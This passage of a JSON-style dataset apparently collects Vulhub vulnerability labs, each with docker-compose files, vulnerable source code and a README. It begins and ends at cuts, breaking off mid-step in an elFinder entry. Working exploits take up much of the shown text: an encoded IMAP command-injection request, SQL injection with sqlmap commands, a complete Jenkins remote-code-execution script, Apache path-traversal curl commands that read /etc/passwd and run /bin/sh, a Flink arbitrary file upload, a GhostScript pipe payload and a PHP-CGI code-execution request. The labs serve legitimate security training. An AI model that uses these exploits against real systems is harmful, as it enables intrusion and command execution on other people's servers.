    "readme": "# PHP IMAP Remote Command Execution (CVE-2018-19518)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe PHP IMAP extension is used for email operations in PHP. Its `imap_open` function calls `rsh` to connect to remote shells. In Debian/Ubuntu systems, `ssh` is used by default instead of `rsh` (meaning when you execute the `rsh` command, it actually executes `ssh`).\n\nSince the `ssh` command allows setting `-oProxyCommand=` to call third-party commands, attackers can inject this parameter to achieve remote command execution.\n\nReferences:\n\n- <https://bugs.php.net/bug.php?id=77153>\n- <https://github.com/Bo0oM/PHP_imap_open_exploit>\n- <https://antichat.com/threads/463395/#post-4254681>\n- <https://nvd.nist.gov/vuln/detail/CVE-2018-19518>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable PHP server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080` to access the web page. The web functionality tests whether a mail server can be successfully connected, requiring server address, username, and password.\n\nThe source code can be found in [index.php](www/index.php)\n\n## Vulnerability Reproduction\n\nSend the following request to execute the command `echo '1234567890'>/tmp/test0001`:\n\n```\nPOST / HTTP/1.1\nHost: your-ip\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 125\n\nhostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222\n```\n\nExecute `docker compose exec web bash` to enter the container, and you can see that `/tmp/test0001` has been successfully created:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2021-45788.md",
    "filenamenomd": "CVE-2021-45788",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/metersphere/CVE-2021-45788/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/metersphere/CVE-2021-45788/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 1108 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: \"2.1\"\nservices:\n  web:\n    image: vulhub/metersphere:1.15.4\n    ports:\n      - \"8081:8081\"\n      - \"5005:5005\"\n    environment:\n      MYSQL_SERVER: db:3306\n      MYSQL_DB: metersphere\n      MYSQL_USERNAME: root\n      MYSQL_PASSWORD: root\n      KAFKA_SERVER: kafka:9092\n  db:\n    image: mysql:5.7\n    command: --sql-mode=\"STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\" --max-connections=8000\n    environment:\n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=metersphere\n  kafka:\n    image: bitnami/kafka:3.4.1\n    environment:\n      # KRaft settings\n      - KAFKA_CFG_NODE_ID=0\n      - KAFKA_CFG_PROCESS_ROLES=controller,broker\n      - KAFKA_CFG_CONTROLLER_QUORUM_VOTERS=0@kafka:9093\n      # Listeners\n      - KAFKA_CFG_LISTENERS=PLAINTEXT://:9092,CONTROLLER://:9093\n      - KAFKA_CFG_ADVERTISED_LISTENERS=PLAINTEXT://:9092\n      - KAFKA_CFG_LISTENER_SECURITY_PROTOCOL_MAP=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT\n      - KAFKA_CFG_CONTROLLER_LISTENER_NAMES=CONTROLLER\n      - KAFKA_CFG_INTER_BROKER_LISTENER_NAME=PLAINTEXT\n\n```\n\n",
    "readme": "# MeterSphere v1.15.4 Authenticated SQL Injection (CVE-2021-45788)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nMeterSphere is a one-stop open source continuous testing platform under the GPL v3 open source license.\n\nIn the version v1.15.4 and before, MeterSphere's testcase related APIs have order-by based SQL injection.\n\nReferences:\n\n- <https://github.com/metersphere/metersphere/issues/8651>\n\n## Vulnerable environment\n\nExecute following command to start a MeterSphere server v1.15.4:\n\n```\ndocker compose up -d\n```\n\nAfter the server is fully initialized, you can see the login page of MeterSphere on `http://your-ip:8081`.\n\n## Exploit\n\nFirstly, login to the panel by username `admin` and password `metersphere`.\n\nAdd a new testcase at `http://your-ip:8081/#/track/case/all`:\n\n![](1.png)\n\nThen, send the following request to test if SQL injection exists (replace csrf token and session id with yours):\n\n```\nPOST /test/case/list/1/10 HTTP/1.1\nHost: localhost.lan:8081\nContent-Length: 3142\nAccept: application/json, text/plain, */*\nCSRF-TOKEN: [Your CSRF Token]\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7\nCookie: MS_SESSION_ID=[Your Session ID]\nConnection: close\n\n{\"orders\":[{\"name\":\"name\",\"type\":\",if(1=1,sleep(2),0)\"}],\"components\":[{\"key\":\"name\",\"name\":\"MsTableSearchInput\",\"label\":\"commons.name\",\"operator\":{\"value\":\"like\",\"options\":[{\"label\":\"commons.adv_search.operators.like\",\"value\":\"like\"},{\"label\":\"commons.adv_search.operators.not_like\",\"value\":\"not like\"}]}},{\"key\":\"tags\",\"name\":\"MsTableSearchInput\",\"label\":\"commons.tag\",\"operator\":{\"value\":\"like\",\"options\":[{\"label\":\"commons.adv_search.operators.like\",\"value\":\"like\"},{\"label\":\"commons.adv_search.operators.not_like\",\"value\":\"not like\"}]}},{\"key\":\"module\",\"name\":\"MsTableSearchInput\",\"label\":\"test_track.case.module\",\"operator\":{\"value\":\"like\",\"options\":[{\"label\":\"commons.adv_search.operators.like\",\"value\":\"like\"},{\"label\":\"commons.adv_search.operators.not_like\",\"value\":\"not like\"}]}},{\"key\":\"priority\",\"name\":\"MsTableSearchSelect\",\"label\":\"test_track.case.priority\",\"operator\":{\"options\":[{\"label\":\"commons.adv_search.operators.in\",\"value\":\"in\"},{\"label\":\"commons.adv_search.operators.not_in\",\"value\":\"not in\"}]},\"options\":[{\"label\":\"P0\",\"value\":\"P0\"},{\"label\":\"P1\",\"value\":\"P1\"},{\"label\":\"P2\",\"value\":\"P2\"},{\"label\":\"P3\",\"value\":\"P3\"}],\"props\":{\"multiple\":true}},{\"key\":\"createTime\",\"name\":\"MsTableSearchDateTimePicker\",\"label\":\"commons.create_time\",\"operator\":{\"options\":[{\"label\":\"commons.adv_search.operators.between\",\"value\":\"between\"},{\"label\":\"commons.adv_search.operators.gt\",\"value\":\"gt\"},{\"label\":\"commons.adv_search.operators.ge\",\"value\":\"ge\"},{\"label\":\"commons.adv_search.operators.lt\",\"value\":\"lt\"},{\"label\":\"commons.adv_search.operators.le\",\"value\":\"le\"},{\"label\":\"commons.adv_search.operators.equals\",\"value\":\"eq\"}]}},{\"key\":\"updateTime\",\"name\":\"MsTableSearchDateTimePicker\",\"label\":\"commons.update_time\",\"operator\":{\"options\":[{\"label\":\"commons.adv_search.operators.between\",\"value\":\"between\"},{\"label\":\"commons.adv_search.operators.gt\",\"value\":\"gt\"},{\"label\":\"commons.adv_search.operators.ge\",\"value\":\"ge\"},{\"label\":\"commons.adv_search.operators.lt\",\"value\":\"lt\"},{\"label\":\"commons.adv_search.operators.le\",\"value\":\"le\"},{\"label\":\"commons.adv_search.operators.equals\",\"value\":\"eq\"}]}},{\"key\":\"creator\",\"name\":\"MsTableSearchSelect\",\"label\":\"api_test.creator\",\"operator\":{\"options\":[{\"label\":\"commons.adv_search.operators.in\",\"value\":\"in\"},{\"label\":\"commons.adv_search.operators.not_in\",\"value\":\"not in\"},{\"label\":\"commons.adv_search.operators.current_user\",\"value\":\"current user\"}]},\"options\":{\"url\":\"/user/list\",\"labelKey\":\"name\",\"valueKey\":\"id\"},\"props\":{\"multiple\":true}},{\"key\":\"reviewStatus\",\"name\":\"MsTableSearchSelect\",\"label\":\"test_track.review_view.execute_result\",\"operator\":{\"options\":[{\"label\":\"commons.adv_search.operators.in\",\"value\":\"in\"},{\"label\":\"commons.adv_search.operators.not_in\",\"value\":\"not in\"}]},\"options\":[{\"label\":\"test_track.review.prepare\",\"value\":\"Prepare\"},{\"label\":\"test_track.review.pass\",\"value\":\"Pass\"},{\"label\":\"test_track.review.un_pass\",\"value\":\"UnPass\"}],\"props\":{\"multiple\":true}}],\"filters\":{\"reviewStatus\":[\"Prepare\",\"Pass\",\"UnPass\"]},\"planId\":\"\",\"nodeIds\":[],\"selectAll\":false,\"unSelectIds\":[],\"selectThisWeedData\":false,\"selectThisWeedRelevanceData\":false,\"caseCoverage\":null}\n```\n\nAs you can see, a 2 seconds sleep successful:\n\n![](2.png)\n\nUse SQLMap to retrieve the database username:\n\n```\npython sqlmap.py -r req.txt --dbms mysql --technique T --prefix , --level 3\npython sqlmap.py -r req.txt --dbms mysql --technique T --prefix , --level 3 --current-user\n```\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2018-1000861.md",
    "filenamenomd": "CVE-2018-1000861",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2018-1000861/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2018-1000861/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2018-1000861/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 2951 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/python\n# coding: UTF-8\n# author: Orange Tsai(@orange_8361)\n# \n\nimport sys\nimport requests\nfrom enum import Enum\n\n# remove bad SSL warnings\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\n\nendpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'\n\nclass mode(Enum):\n    ACL_PATCHED = 0\n    NOT_JENKINS = 1\n    READ_ENABLE = 2\n    READ_BYPASS = 3\n    ENTRY_NOTFOUND = 999\n\ndef usage():\n    print '''\n  Usage:\n    python exp.py <url> <cmd>\n    '''\n\ndef _log(msg, fail=False):\n    nb = '[*]'\n    if fail:\n        nb = '[-]'\n    print '%s %s' % (nb, msg)\n\ndef _get(url, params=None):\n    r = requests.get(url, verify=False, params=params)\n    return r.status_code, r.content\n\ndef _add_bypass(url):\n    return url + 'securityRealm/user/admin/'\n\ndef check(url):\n    flag, accessible = mode.ACL_PATCHED, False\n\n    # check ANONYMOUS_READ\n    status, content = _get(url)\n    if status == 200 and 'adjuncts' in content:\n        flag, accessible = mode.READ_ENABLE, True\n        _log('ANONYMOUS_READ enable!')\n    elif status == 403:\n        _log('ANONYMOUS_READ disable!')\n\n        # check ACL bypass, CVE-2018-1000861\n        status, content = _get(_add_bypass(url))\n        if status == 200 and 'adjuncts' in content:\n            flag, accessible = mode.READ_BYPASS, True\n    else:\n        flag = mode.NOT_JENKINS\n\n    # check entry point, CVE-2019-1003005\n    if accessible:\n        if flag is mode.READ_BYPASS:\n            url = _add_bypass(url)\n        status, content = _get(url + endpoint)\n\n        if status == 404:\n            flag = mode.ENTRY_NOTFOUND\n\n    return flag\n\ndef exploit(url, cmd):\n    payload = 'public class x{public x(){new String(\"%s\".decodeHex()).execute()}}' % cmd.encode('hex')\n    params = {\n        'sandbox': True, \n        'value': payload\n    }\n\n    status, content = _get(url + endpoint, params)\n    if status == 200:\n        _log('Exploit success!(it should be :P)')\n    elif status == 405:\n        _log('It seems Jenkins has patched the RCE gadget :(')\n    else:\n        _log('Exploit fail with HTTP status [%d]' % status, fail=True)\n        if 'stack trace' in content:\n            for _ in content.splitlines():\n                if _.startswith('Caused:'):\n                    _log(_, fail=True)\n\nif __name__ == '__main__':\n    if len(sys.argv) != 3:\n        usage()\n        exit()\n\n    url = sys.argv[1].rstrip('/') + '/'\n    cmd = sys.argv[2]\n\n    flag = check(url)\n    if flag is mode.ACL_PATCHED:\n        _log('It seems Jenkins is up-to-date(>2.137) :(', fail=True)\n    elif flag is mode.NOT_JENKINS:\n        _log('Is this Jenkins?', fail=True)\n    elif flag is mode.READ_ENABLE:\n        exploit(url, cmd)\n    elif flag is mode.READ_BYPASS:\n        _log('Bypass with CVE-2018-1000861!')\n        exploit(_add_bypass(url), cmd)\n    else:\n        _log('The `checkScript` is not found, please try other entries(see refs)', fail=True)\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2018-1000861/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 120 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  jenkins:\n    image: vulhub/jenkins:2.138\n    ports:\n      - \"50000:50000\"\n      - \"8080:8080\"\n    init: true\n```\n\n",
    "readme": "# Jenkins Remote Code Execution (CVE-2018-1000861)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJenkins is a popular open-source automation server.\n\nA code execution vulnerability exists in the Stapler web framework used by Jenkins 2.153 and earlier, LTS 2.138.3 and earlier. In `stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java`, attackers can invoke some methods on Java objects by accessing crafted URLs that were not intended to be invoked this way.\n\nThrough this vulnerability, multiple exploit chains can be discovered. The most severe one allows unauthenticated users to execute arbitrary commands by bypassing the Groovy sandbox: Before Jenkins executes Groovy scripts in the sandbox, it first checks for syntax errors. This checking process occurs outside the sandbox, allowing attackers to execute arbitrary commands through Meta-Programming during this validation step.\n\nReferences:\n\n- http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html\n- http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html\n- https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html\n\n## Environment Setup\n\nExecute the following command to start Jenkins 2.138 with the vulnerable plugins pre-installed:\n\n```\ndocker compose up -d\n```\n\nAfter the server is fully started, visit `http://your-ip:8080` to access Jenkins. No manual installation is required.\n\n## Vulnerability Reproduction\n\nUsing @orangetw's [one-click POC script](https://github.com/orangetw/awesome-jenkins-rce-2019), you can execute commands by sending the following request:\n\n```\nhttp://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript\n?sandbox=true\n&value=public class x {\n  public x(){\n    \"touch /tmp/success\".execute()\n  }\n}\n```\n\n![Sending the exploit request](2.png)\n\nThe successful creation of `/tmp/success` confirms the remote code execution:\n\n![Verification of command execution](3.png)\n"
  },
  {
    "filename": "CVE-2021-41773.md",
    "filenamenomd": "CVE-2021-41773",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-41773/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-41773/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-41773/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 70 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n apache:\n   build: .\n   ports:\n    - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-41773/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 838 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/httpd:2.4.49\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && sed -i \"s|#LoadModule cgid_module modules/mod_cgid.so|LoadModule cgid_module modules/mod_cgid.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#LoadModule cgi_module modules/mod_cgi.so|LoadModule cgi_module modules/mod_cgi.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#Include conf/extra/httpd-autoindex.conf|Include conf/extra/httpd-autoindex.conf|g\" /usr/local/apache2/conf/httpd.conf \\\n    && cat /usr/local/apache2/conf/httpd.conf \\\n        | tr '\\n' '\\r' \\\n        | perl -pe 's|<Directory />.*?</Directory>|<Directory />\\n    AllowOverride none\\n    Require all granted\\n</Directory>|isg' \\\n        | tr '\\r' '\\n' \\\n        | tee /tmp/httpd.conf \\\n    && mv /tmp/httpd.conf /usr/local/apache2/conf/httpd.conf\n\n```\n\n",
    "readme": "# Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.\n\nA flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root.\n\nIf files outside of these directories are not protected by the usual default configuration \"require all denied\", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.\n\nReferences:\n\n- https://httpd.apache.org/security/vulnerabilities_24.html\n- https://twitter.com/ptswarm/status/1445376079548624899\n- https://twitter.com/HackerGautam/status/1445412108863041544\n- https://twitter.com/snyff/status/1445565903161102344\n\n## Vulnerable environment\n\nExecute following commands to start a vulnerable Apache HTTP Server:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server is started, you can see the default page which says `It works!` of Apache HTTP Server through `http://your-ip:8080`.\n\n## Exploit\n\nA simple CURL command to reproduce the vulnerability (Note that `/icons/` must be a existing directory):\n\n```\ncurl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n```\n\nThe `/etc/passwd` is disclosured successfully:\n\n![](1.png)\n\nWith the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:\n\n```\ncurl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-17518.md",
    "filenamenomd": "CVE-2020-17518",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/flink/CVE-2020-17518/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/flink/CVE-2020-17518/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 117 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n flink:\n   image: vulhub/flink:1.11.2\n   command: jobmanager\n   ports:\n    - \"8081:8081\"\n    - \"6123:6123\"\n\n```\n\n",
    "readme": "# Apache Flink Upload Path Traversal (CVE-2020-17518)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities.\n\nA vulnerability in Apache Flink 1.5.1 and later versions allows attackers to write uploaded files to arbitrary locations on the local file system through a maliciously crafted HTTP header in the REST API request. This issue is fixed in Apache Flink 1.11.3.\n\nReferences:\n\n- <https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4>\n- <https://nvd.nist.gov/vuln/detail/CVE-2020-17518>\n\n## Environment Setup\n\nExecute the following command to start an Apache Flink jobmanager 1.11.2:\n\n```\ndocker compose up -d\n```\n\nAfter the Apache Flink service is started, visit `http://your-ip:8081` to access the management interface.\n\n## Vulnerability Reproduction\n\nSend the following HTTP request to upload a file to `/tmp/success` on the target server:\n\n```\nPOST /jars/upload HTTP/1.1\nHost: localhost:8081\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Length: 187\n\n------WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../tmp/success\"\n\nsuccess\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--\n```\n\nAfter the file is uploaded, you can check the `/tmp/success` file on the target server:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2018-16509.md",
    "filenamenomd": "CVE-2018-16509",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-16509/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-16509/poc.png\n- /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-16509/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-16509/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 188 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/imagemagick:7.0.8-10-php\n   command: php -t /var/www/html -S 0.0.0.0:8080\n   volumes:\n    - ./index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-16509/poc.png\n\n- Extension: .png\n- Language: unknown\n- Size: 210 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n%!PS\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ghostscript/CVE-2018-16509/index.php\n\n- Extension: .php\n- Language: php\n- Size: 472 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\n\nif (!empty($_FILES)):\n\n$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\nif (!in_array($ext, ['gif', 'png', 'jpg', 'jpeg'])) {\n    die('Unsupported filetype uploaded.');\n}\n\n$size = shell_exec(\"identify -format '%w x %h' {$_FILES['file_upload']['tmp_name']}\");\n\necho \"Image size is: $size\";\n\nelse:\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<?php\nendif;\n```\n\n",
    "readme": "# GhostScript Sandbox Bypass Command Execution (CVE-2018-16509)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries such as ImageMagick and Python PIL.\n\nOn August 21st, 2018, security researcher Tavis Ormandy disclosed that GhostScript's security sandbox could be bypassed through maliciously crafted image content, leading to command execution, file reading, and file deletion vulnerabilities.\n\nReferences:\n\n- <http://seclists.org/oss-sec/2018/q3/142>\n- <https://bugs.chromium.org/p/project-zero/issues/detail?id=1640>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable environment (including GhostScript 9.23 and ImageMagick 7.0.8):\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080` to see an upload component.\n\n## Vulnerability Reproduction\n\nUpload [poc.png](poc.png) to execute the command `id > /tmp/success && cat /tmp/success`. Enter the container using `docker compose exec web bash`, and you will see that /tmp/success has been created.\n\n![](1.png)\n\nYou can also test this vulnerability using the command line:\n\n```\ndocker run -it --rm --name im -v `pwd`/poc.png:/poc.png vulhub/imagemagick:7.0.8-10 convert /poc.png /poc.gif\n```\n\nThe command execution result shows that the `id` command has been successfully executed.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2012-1823.md",
    "filenamenomd": "CVE-2012-1823",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2012-1823/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2012-1823/www/info.php\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2012-1823/www/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2012-1823/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 110 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n php:\n   image: vulhub/php:5.4.1-cgi\n   volumes:\n    - ./www:/var/www/html\n   ports:\n    - \"8080:80\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2012-1823/www/info.php\n\n- Extension: .php\n- Language: php\n- Size: 16 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nphpinfo();\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2012-1823/www/index.php\n\n- Extension: .php\n- Language: php\n- Size: 169 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nheader(\"Content-Type: text/html; charset=utf-8\");\necho \"Hello, \\n\";\necho \"Your name is <strong>\" . (isset($_GET['name']) ? $_GET['name'] : 'Vulhub') . '</strong>';\n```\n\n",
    "readme": "# PHP-CGI Remote Code Execution (CVE-2012-1823)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPHP-CGI is a SAPI (Server Application Programming Interface) implementation that allows PHP to communicate with web servers. A vulnerability in PHP-CGI allows attackers to pass command-line arguments to PHP through query strings, potentially leading to remote code execution.\n\nAffected versions: PHP < 5.3.12 or PHP < 5.4.2\n\nReferences:\n\n- <http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/>\n- <https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html>\n\n## Environment Setup\n\nExecute the following command to start a web server that uses PHP-CGI 5.4.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080/` to see the \"Hello\" message.\n\n## Vulnerability Reproduction\n\nVisit `http://your-ip:8080/index.php?-s` to reveal the source code, confirming the vulnerability exists. Send the following request to execute arbitrary PHP code:\n\n```\nPOST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1\nHost: example.com\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\n\n<?php echo shell_exec(\"id\"); ?>\n```\n\n## Technical Details\n\n### PHP SAPI and Running Modes\n\nPHP-CGI can run in two modes:\n\n1. CGI mode: The web server creates a new process for each request\n2. FastCGI mode: A persistent process handles multiple requests\n\nAccording to RFC3875, when the query string doesn't contain an unencoded `=` character, it should be passed as CGI parameters. Apache implemented this requirement, but PHP didn't properly handle this case, leading to this vulnerability.\n\nThe simplest exploitation method is using the `-s` parameter to display source code:\n\n![](1.png)\n\nA more powerful method is using `-d` to specify `auto_prepend_file`, creating an arbitrary file inclusion vulnerability:\n\n![](2.png)\n\nNote: Replace spaces with `+` or `%20`, and encode `=` characters.\n\n### CVE-2012-2311 - The Incomplete Fix\n\nPHP initially fixed this vulnerability in versions 5.4.2 and 5.3.12 by checking for the `-` character at the start of the query string. However, this fix was incomplete and could be bypassed (CVE-2012-2311) when PHP-CGI was wrapped in a shell script:\n\n```sh\n#!/bin/sh\nexec /usr/local/bin/php-cgi $*\n```\n\nBy adding whitespace before the `-`, attackers could still pass parameters as the first character would be a space instead of `-`.\n\nPHP addressed this in versions 5.4.3 and 5.3.13 by skipping all leading whitespace before checking for the `-` character.\n"
  },
  {
    "filename": "CVE-2021-32682.md",
    "filenamenomd": "CVE-2021-32682",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/elfinder/CVE-2021-32682/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/elfinder/CVE-2021-32682/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 88 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/elfinder:2.1.58\n   ports:\n    - \"8080:80\"\n\n```\n\n",
    "readme": "# elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nelFinder is an open-source file manager for web, written in JavaScript using jQuery UI.\n\nThere is a arguments injection vulnerability found in the elFinder 2.1.48 and before. This vulnerability can allow an attacker to execute arbitrary commands on the server hosting the elFinder PHP connector, even with minimal configuration. The issues were patched in version 2.1.59. As a workaround, ensure the connector is not exposed without authentication.\n\nReferences:\n\n- <https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities>\n- <https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt>\n- <https://xz.aliyun.com/t/10739>\n\n## Vulnerability Environment\n\nExecute following command to start a elFinder 2.1.48:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see the main page of elFinder at `http://your-ip:8080`.\n\n## Vulnerability Reproduce\n\nFirstly, you should prepare 2 files for this vulnerability flow.\n\nCreate a plain text file named `1.txt`:\n\n![](1.png)\n\nArchive this file in the right-click menu to ZIP format, and modify this archived file name to 